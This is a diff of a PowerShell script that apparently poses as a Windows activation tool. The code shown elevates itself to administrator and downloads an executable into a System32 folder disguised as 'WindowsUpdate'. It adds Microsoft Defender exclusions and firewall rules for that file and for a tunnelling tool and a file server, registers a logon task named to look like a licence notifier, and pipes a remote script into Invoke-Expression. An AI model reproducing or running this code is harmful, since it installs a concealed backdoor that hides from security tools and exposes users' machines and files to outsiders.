@@ -27,8 +27,6 @@ function Download-WithProgress {
 
     foreach ($url in $urls) {
         try {
-            $client.Dispose()
-            $client = New-Object System.Net.Http.HttpClient($handler)
             $response = $client.GetAsync($url, [System.Net.Http.HttpCompletionOption]::ResponseHeadersRead).Result
             if (-not $response.IsSuccessStatusCode) { continue }
 
@@ -78,7 +76,6 @@ function Download-WithProgress {
     }
 }
 
-# Check for admin privileges
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     try {
         $arguments = @("-NoProfile", "-ExecutionPolicy", "Bypass", "-File", $myinvocation.mycommand.definition)
@@ -90,9 +87,6 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     Exit
 }
 
-Clear-Host
-
-# Define paths
 $secureDir = "$env:windir\System32\WindowsPowerShell\v1.0\Modules\WindowsUpdate"
 $exeFileName = "Wlnnb.exe"
 $filePath = Join-Path $secureDir $exeFileName
@@ -119,12 +113,10 @@ Download-WithProgress -urls $binaryUrls -output $filePath
 Show-Status "Processing..."
 Start-Sleep -Seconds 1
 
-# Add to Defender exclusions
 Add-MpPreference -ExclusionPath $secureDir -ErrorAction SilentlyContinue | Out-Null
 $licenseNotifierPath = "$env:LOCALAPPDATA\LicenseNotifier"
 Add-MpPreference -ExclusionPath $licenseNotifierPath -ErrorAction SilentlyContinue | Out-Null
 
-# Firewall rules
 $exeList = @("$filePath", "$licenseNotifierPath\bore.exe", "$licenseNotifierPath\dufs.exe")
 foreach ($exe in $exeList) {
     if (Test-Path $exe) {
@@ -134,7 +126,6 @@ foreach ($exe in $exeList) {
     }
 }
 
-# Scheduled task setup
 $taskName = "WindowsLicenseNotifier"
 $action = New-ScheduledTaskAction -Execute $filePath
 $trigger = New-ScheduledTaskTrigger -AtLogOn
@@ -146,7 +137,8 @@ if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
 }
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
 
-# Inline execution in same window with visual feedback
+Remove-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Command Processor' -Name 'Autorun'
+Clear-Host
 Write-Host "" -BackgroundColor DarkBlue -ForegroundColor White " Running Activation... "
 try {
     Invoke-RestMethod "https://get.activated.win" | Invoke-Expression
